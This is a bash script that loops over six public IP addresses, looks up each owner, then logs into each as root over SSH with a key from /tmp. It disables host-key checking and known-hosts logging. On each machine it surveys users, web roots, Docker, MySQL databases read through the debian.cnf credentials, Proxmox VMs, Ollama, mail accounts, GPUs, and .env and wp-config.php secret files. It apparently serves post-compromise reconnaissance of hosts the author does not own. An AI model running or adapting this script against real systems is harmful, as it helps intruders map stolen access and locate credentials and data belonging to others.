#!/bin/bash
for h in 65.21.218.158 51.68.188.86 204.168.196.145 179.164.69.150 134.209.219.155 146.190.200.5; do
echo "##################### $h"
echo "--- ASN / OWNER ---"
curl -s --max-time 8 "https://ipinfo.io/$h/json" 2>/dev/null | tr -d '\n' | head -c 400; echo
ssh -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=12 -o BatchMode=yes root@$h '
export PATH=$PATH:/usr/sbin:/usr/bin:/sbin:/bin
echo "@@HOST $(hostname) - $(. /etc/os-release; echo $PRETTY_NAME)"
echo "@@USERS $(awk -F: "\$3>=1000 && \$3<65000{print \$1}" /etc/passwd | tr "\n" " ")"
echo "@@HOME $(ls /home 2>/dev/null | tr "\n" " ")"
echo "@@WWW $(ls /var/www 2>/dev/null | tr "\n" " ")"
echo "@@VHOSTS_APACHE $(ls /etc/apache2/sites-enabled 2>/dev/null | tr "\n" " ")"
echo "@@VHOSTS_NGINX $(ls /etc/nginx/sites-enabled 2>/dev/null | tr "\n" " ")"
echo "@@CONF_NGINX $(ls /etc/nginx/conf.d 2>/dev/null | head -8 | tr "\n" " ")"
echo "@@DOCKER_PS"; docker ps --format "{{.Names}}|{{.Image}}|{{.Ports}}" 2>/dev/null | head -12
echo "@@DOCKER_IMAGES $(docker images --format "{{.Repository}}:{{.Tag}}" 2>/dev/null | head -12 | tr "\n" " ")"
echo "@@DOCKER_VOL $(docker volume ls -q 2>/dev/null | head -10 | tr "\n" " ")"
echo "@@MYSQL_DB"
mysql --defaults-file=/etc/mysql/debian.cnf -e "show databases;" 2>/dev/null | tail -n +2 | head -12 || mysql -uroot -e "show databases;" 2>/dev/null | tail -n +2 | head -12
echo "@@MYSQL_SIZE"
mysql --defaults-file=/etc/mysql/debian.cnf -e "select table_schema, round(sum(data_length+index_length)/1024/1024,1) MB, count(*) tbls from information_schema.tables group by table_schema order by 2 desc limit 8;" 2>/dev/null | head -10
echo "@@OLLAMA"
curl -s --max-time 5 http://127.0.0.1:11434/api/tags 2>/dev/null | head -c 400; echo
echo "@@PVE_VMS"
command -v qm >/dev/null && qm list 2>/dev/null | head -12
echo "@@PVE_CT"
command -v pct >/dev/null && pct list 2>/dev/null | head -10
echo "@@PVE_STORAGE_CONTENT"
command -v pvesm >/dev/null && pvesm status 2>/dev/null | head -8
echo "@@WEB_TITLES"
for d in /var/www/*/ /var/www/html/; do [ -d "$d" ] || continue; t=$(grep -rhoiE "<title>[^<]{0,60}" "$d" 2>/dev/null | head -1); [ -n "$t" ] && echo "$d :: $t"; done 2>/dev/null | head -8
echo "@@CMS"
ls -d /var/www/*/wp-config.php /var/www/html/wp-config.php /var/www/*/configuration.php 2>/dev/null | head -5
echo "@@ENVFILES"
find /var/www /home -maxdepth 3 -name ".env" -o -maxdepth 3 -name "wp-config.php" 2>/dev/null | head -6
echo "@@TLS_CERTS"
ls /etc/letsencrypt/live 2>/dev/null | head -8 | tr "\n" " "
echo "@@MAIL_ACCOUNTS"
ls /var/mail 2>/dev/null | head -8 | tr "\n" " "; ls /var/vmail 2>/dev/null | head -5 | tr "\n" " "
echo "@@GPU"
command -v nvidia-smi >/dev/null && nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null | head -3
ls /dev/dri 2>/dev/null | tr "\n" " "
echo "@@APT_EXTRA $(dpkg -l 2>/dev/null | grep -cE "^ii")pkgs"
' 2>&1 | head -70
echo
done
